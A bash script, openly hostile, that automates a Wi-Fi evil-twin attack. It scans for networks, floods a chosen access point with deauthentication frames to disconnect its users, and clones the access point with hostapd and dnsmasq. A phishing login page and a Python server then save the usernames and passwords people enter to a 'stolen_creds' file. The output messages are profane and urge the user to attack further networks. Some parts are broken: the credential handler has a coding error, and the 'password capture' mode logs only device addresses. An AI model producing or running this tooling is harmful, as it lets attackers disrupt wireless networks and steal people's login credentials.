#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'
enable_monitor_mode(){
    iface="$1"
    mode=$(iwconfig "$iface" 2>/dev/null | grep -i "Mode:Monitor")
    if [ -n "$mode" ]; then
        echo "[✓] Interface $iface is already in Monitor mode"
    else
        echo "[*] Enabling Monitor mode on $iface..."
        sudo airmon-ng check kill
        sudo airmon-ng start "$iface"
        echo "[✓] Done"
    fi
}
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Run this shit as root, you fucking peasant!${NC}"
        exit 1
    fi
}
scan_networks() {
    echo -e "${GREEN}[*] Scanning for vulnerable networks...${NC}"
    airmon-ng start wlan0 > /dev/null 2>&1
    airodump-ng wlan0mon --output-format csv -w scan > /dev/null 2>&1 &
    SCAN_PID=$!
    sleep 10
    kill $SCAN_PID   
    echo -e "${GREEN}[*] Available networks:${NC}"
    cat scan-01.csv | grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | awk -F',' '{print $14 " - " $1}' | sort | uniq
}
deauth_network() {
    echo -e "${GREEN}[*] Launching deauthentication attack on ${TARGET_BSSID}...${NC}"
    aireplay-ng --deauth 0 -a $TARGET_BSSID wlan0mon > /dev/null 2>&1 &
    DEAUTH_PID=$!
}
create_evil_twin() {
    echo -e "${GREEN}[*] Creating evil twin: ${TARGET_ESSID}...${NC}"
    cat > /tmp/hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=${TARGET_ESSID}
channel=${TARGET_CHANNEL}
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=FreePublicWifi
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
    cat > /tmp/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF
    hostapd /tmp/hostapd.conf -B
    ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
    dnsmasq -C /tmp/dnsmasq.conf -d &
    DNSMASQ_PID=$!
}
page_mode() {
    echo -e "${GREEN}[*] Starting credential harvesting page...${NC}"
    cat > /var/www/html/index.html << EOF
<html>
<head><title>Network Login Required</title></head>
<body>
<h1>Network Authentication Required</h1>
<form action="/login" method="post">
Username: <input type="text" name="username"><br>
Password: <input type="password" name="password"><br>
<input type="submit" value="Login">
</form>
</body>
</html>
EOF
    python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
class CredentialHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.read.read(content_length).decode('utf-8')
        credentials = urllib.parse.parse_qs(post_data)
        with open('/tmp/stolen_creds.txt', 'a') as f:
            f.write(f'Username: {credentials.get(\"username\", [\"\"])[0]}\n')
            f.write(f'Password: {credentials.get(\"password\", [\"\"])[0]}\n')
            f.write('---\n')
        self.send_response(302)
        self.send_header('Location', 'http://www.google.com')
        self.end_headers()
server = HTTPServer(('10.0.0.1', 80), CredentialHandler)
server.serve_forever()
" &
    WEB_PID=$!
}
password_mode() {
    echo -e "${GREEN}[*] Waiting for victims to enter WiFi password...${NC}"
    echo -e "${GREEN}[*] Captured passwords will be saved to /tmp/wifi_passwords.txt${NC}"
    tail -f /var/log/dnsmasq.log | grep -E "DHCPACK.*" | while read line; do
        CLIENT_MAC=$(echo $line | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
        echo "[+] New victim connected: $CLIENT_MAC" >> /tmp/wifi_passwords.txt
        echo "[+] Potential password attempt logged" >> /tmp/wifi_passwords.txt
        echo "---" >> /tmp/wifi_passwords.txt
    done &
    LOG_PID=$!
}
iwconfig
read -p "Enter interface name: " interface_name
enable_monitor_mode "$interface_name"
check_root
echo -e "${GREEN}[*] Starting network scan...${NC}"
scan_networks
read -p "Enter target network name (ESSID): " TARGET_ESSID
read -p "Enter target BSSID (MAC address): " TARGET_BSSID
read -p "Enter target channel: " TARGET_CHANNEL
echo -e "${GREEN}[1] Page Mode (Credential Harvesting)${NC}"
echo -e "${GREEN}[2] Password Mode (WiFi Password Capture)${NC}"
read -p "Select attack mode: " MODE
deauth_network
create_evil_twin
case $MODE in
    1)
        page_mode
        echo -e "${GREEN}[*] Credential harvesting active! Check /tmp/stolen_creds.txt${NC}"
        ;;
    2)
        password_mode
        echo -e "${GREEN}[*] Password capture active! Check /tmp/wifi_passwords.txt${NC}"
        ;;
    *)
        echo -e "${RED}[!] Invalid mode!${NC}"
        ;;
esac
echo -e "${GREEN}[*] Evil twin attack running! Press Ctrl+C to stop this beautiful madness.${NC}"
trap 'kill $DEAUTH_PID $DNSMASQ_PID $WEB_PID $LOG_PID 2>/dev/null; airmon-ng stop wlan0mon; echo -e "${RED}[*] Attack stopped. Go fuck up another network!${NC}"; exit 0' INT
while true; do
    sleep 1
done